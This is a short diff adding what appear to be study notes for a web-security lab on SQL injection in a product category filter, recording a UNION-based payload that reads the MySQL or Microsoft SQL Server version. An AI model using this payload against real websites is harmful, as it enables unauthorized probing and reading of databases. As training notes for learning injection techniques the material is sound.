@@ -1,0 +1,5 @@
+-SQL injection attack, querying the database type and version on MySQL and Microsoft
+-SQL Injection - Product Category
+-display the database version
+
+payload: " ' UNION SELECT 'a', @@version#"
